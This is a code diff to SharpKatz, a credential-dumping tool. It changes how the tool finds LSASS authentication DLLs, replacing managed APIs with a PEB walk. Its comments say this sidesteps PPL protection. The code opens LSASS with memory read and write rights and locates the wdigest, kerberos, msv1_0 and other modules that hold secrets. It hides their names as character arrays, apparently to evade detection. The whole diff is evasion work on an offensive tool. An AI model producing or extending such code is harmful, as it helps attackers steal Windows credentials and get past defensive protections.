@@ -408,63 +408,42 @@ namespace SharpKatz
                     return;
                 }
 
-                // Module enumeration still uses managed API for base addresses
-                // (full replacement requires PEB->Ldr walk via NtQueryInformationProcess)
-                Process plsass = Process.GetProcessById(targetPid);
-                ProcessModuleCollection processModules = plsass.Modules;
-                int modulefound = 0;
-
-                for (int i = 0; i < processModules.Count && modulefound < 6; i++)
-                {
-                    string lower = processModules[i].ModuleName.ToLowerInvariant();
-
-                    string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
-                    string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
-                    string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
-                    string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
-                    string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
-                    string sDpapisrv = new string(new char[] { 'd','p','a','p','i','s','r','v','.','d','l','l' });
-
-                    if (lower.Contains(sLsasrv))
-                    {
-                        lsasrv = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                    else if (lower.Contains(sWdigest))
-                    {
-                        wdigest = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                    else if (lower.Contains(sMsv))
-                    {
-                        lsassmsv1 = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                    else if (lower.Contains(sKerb))
-                    {
-                        kerberos = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                    else if (lower.Contains(sTspkg))
-                    {
-                        tspkg = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                    else if (lower.Contains(sDpapisrv))
-                    {
-                        dpapisrv = processModules[i].BaseAddress;
-                        modulefound++;
-                    }
-                }
-
-                // Use minimum required access rights instead of PROCESS_ALL_ACCESS
-                // PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
+                // Open LSASS handle first via syscall (ZwOpenProcess), then enumerate modules
+                // via PEB->Ldr walk using NtReadVirtualMemory — avoids managed Process.Modules
+                // which calls OpenProcess internally and gets blocked by PPL
                 hProcess = Natives.OpenProcess(
                     Natives.ProcessAccessFlags.VirtualMemoryRead |
                     Natives.ProcessAccessFlags.VirtualMemoryWrite |
                     Natives.ProcessAccessFlags.VirtualMemoryOperation |
                     Natives.ProcessAccessFlags.QueryInformation,
-                    false, plsass.Id);
+                    false, targetPid);
+
+                if (hProcess == IntPtr.Zero)
+                {
+                    Console.WriteLine("Error: Could not open target process (requires SYSTEM or SeDebugPrivilege)");
+                    return;
+                }
+
+                // Enumerate LSASS modules via PEB walk (NtQueryInformationProcess + NtReadVirtualMemory)
+                var loadedModules = Natives.EnumerateModulesFromPeb(hProcess);
+
+                string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
+                string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
+                string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
+                string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
+                string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
+                string sDpapisrv = new string(new char[] { 'd','p','a','p','i','s','r','v','.','d','l','l' });
+
+                foreach (var kvp in loadedModules)
+                {
+                    string lower = kvp.Key.ToLowerInvariant();
+                    if (lower.Equals(sLsasrv)) lsasrv = kvp.Value;
+                    else if (lower.Equals(sWdigest)) wdigest = kvp.Value;
+                    else if (lower.Equals(sMsv)) lsassmsv1 = kvp.Value;
+                    else if (lower.Equals(sKerb)) kerberos = kvp.Value;
+                    else if (lower.Equals(sTspkg)) tspkg = kvp.Value;
+                    else if (lower.Equals(sDpapisrv)) dpapisrv = kvp.Value;
+                }
 
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
